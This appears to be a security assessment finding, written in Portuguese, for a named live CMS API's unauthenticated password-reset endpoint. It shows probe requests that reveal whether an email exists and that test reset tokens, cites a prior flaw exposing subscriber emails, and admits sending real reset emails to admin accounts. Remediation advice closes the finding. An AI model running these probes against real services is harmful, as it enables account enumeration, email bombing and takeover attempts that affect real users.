@@ -1,0 +1,97 @@
+# F-020 User enumeration + password-reset sem auth + token-validation oracle (CMS API)
+
+Alvo: https://cms.soultv.com.br/v1/account/password/reset
+Severidade: Alta
+Timestamp: 2026-08-27T20:00:00Z
+Descoberto por: webapp (cadeia F-E03 enum → validação Fase 6)
+
+## Vulnerabilidade
+O endpoint `POST /v1/account/password/reset` opera em **dois modos** sem autenticação:
+1. **Trigger (disparar reset):** body `{"email":"<email>"}` → resposta diferencia usuários
+   existentes de inexistentes (user-enumeration oracle).
+2. **Confirm (resetar senha):** body `{"password":"<nova>","token":"<resetCode>"}` →
+   valida o token de reset mapeado ao usuário (token-validation oracle).
+
+Ambos os modos no MESMO path, sem auth, sem CAPTCHA, sem rate limit observado.
+O fluxo do app (Angular, chunk_346 ResetPassModule) confirma:
+`api.post("account/password/reset",{password:..., token:this.resetCode})` onde
+`resetCode = this.route.snapshot.queryParams.code` (token chega via `?code=` no
+link do email de reset).
+
+## Confirmação (read-only)
+
+### User-enumeration oracle (email)
+```
+POST /v1/account/password/reset  {"email":"definitelynonexistent_xyz123@soultv.com.br"}
+  -> {"success":false,"message":"Usuário não existe."}        (200)
+
+POST /v1/account/password/reset  {"email":"admin@tv.com"}        (id=1, de F-014)
+  -> {"success":true,"data":"Nós lhe enviamos um email com instruções."}  (200)
+
+POST /v1/account/password/reset  {"email":"marketing@tv.com"}   (id=2)
+  -> {"success":true,"data":"Nós lhe enviamos um email com instruções."}  (200)
+
+POST /v1/account/password/reset  {"email":"test@soultv.com.br"}  (id=17)
+  -> {"success":true,"data":"Nós lhe enviamos um email com instruções."}  (200)
+```
+→ Emails válidos (enumerados via F-014) retornam mensagem distinta de inexistentes.
+**OPSEC NOTE:** 3 resets reais disparados a contas administrativas/internas
+(admin@tv.com, marketing@tv.com, test@soultv.com.br) — emails de reset efetivamente
+enviados aos donos. Nenhuma conta foi tomada (sem acesso às caixas de email).
+Nenhum reset adicional realizado após confirmação do oracle.
+
+### Token-validation oracle (confirm) — read-only, tokens sintéticos (não resetam)
+```
+POST /v1/account/password/reset  {"password":"NewPass12345!","token":"123456"}
+  -> {"success":false,"message":"Usuário não existe."}
+POST /v1/account/password/reset  {"password":"...","token":"000000"}    -> "Usuário não existe."
+POST /v1/account/password/reset  {"password":"...","token":"abcdef"}   -> "Usuário não existe."
+POST /v1/account/password/reset  {"password":"...","token":""}        -> ["Invalid input."]
+POST /v1/account/password/reset  {"password":"...","token":"MTIzNDU2"} -> "Usuário não existe."
+POST /v1/account/password/reset  {"user_id":1,"password":"X","token":"y"} -> "Usuário não existe."  (mass-assignment user_id rejeitado)
+POST /v1/account/password/reset  {"id":1}                              -> ["Invalid input."]
+```
+→ Token inválido retorna "Usuário não existe" (token é chave de lookup do usuário).
+Token válido produziria resposta distinta (success ou erro de expiração diferente),
+configurando oracle de validação. **Não foi realizado brute de tokens** (OPSEC —
+poderia resetar contas reais se acertasse).
+
+### Confirmação que o reset real dispara (meu próprio foothold, seguro)
+```
+POST /v1/account/password/reset  {"email":"webapp_324898293@protonmail.com"} (id=856436, conta auto-registrada F-013)
+  -> {"success":true,"data":"Nós lhe enviamos um email com instruções."}  (200)
+```
+
+## Impacto
+- **User enumeration massiva e barata:** cruzando com F-014 (BOLA /v1/account/{id} que
+  enumera ~856K assinantes c/ email), o atacante valida qualquer email da base e
+  distingue existentes — supera o oracle do F-014 isolado (que vaza email direto).
+- **Password reset sem auth + sem CAPTCHA + sem rate limit:** permite disparar
+  resets em massa (email bombing) a qualquer conta conhecida → nuisance/DoS de
+  caixa de email + vetor de phishing (atacante envia reset legítimo do soultv,
+  depois phish do "link de reset" via email paralelo).
+- **Account takeover condicional:** se o `token` (resetCode) for previsível/curto/
+  curto-espaço (não verificado — sem acesso à caixa de email), o token-validation
+  oracle permitiria brute para resetar senha de qualquer conta enumerada. A
+  reutilização do MESMO endpoint para trigger e confirm e o lookup "Usuário não
+  existe" para token errado indicam design fraco (token = chave direta, sem
+  separação uidb64/token estilo Django default).
+- Combinado com F-013 (signup aberto) + F-014 (enum emails) + F-016 (Firebase
+  signUp) = superfície ampla de account abuse.
+
+## Recomendação
+- Exigir CAPTCHA (reCAPTCHA Enterprise / hCaptcha) no reset.
+- Rate limit por IP + por email (ex.: 3 resets/email/hora, 10/IP/hora).
+- Resposta genérica idêntica para existente/inexistente ("Se o email existir,
+  enviaremos instruções") — eliminar oracle de enumeração.
+- Separar endpoints `/reset/request` (email) e `/reset/confirm` (token+password).
+- Token de reset: random ≥128 bits, one-shot, expiração curta (15 min), invalidado
+  após uso; NUNCA usar o token como chave de lookup que revele "usuário não existe"
+  (usar mensagem genérica em ambos os modos).
+- Bloquear reset de contas internas/admin (is_staff) por este fluxo (forçar via
+  canal admin separado).
+- Notar LGPD: resets disparados = tratamento de dados pessoais.
+
+## Artefatos
+- enum/webapp/reset/ (probes)
+- Cadeia: F-014 (BOLA /v1/account/{id}), F-013 (signup), F-E03 (enum original)
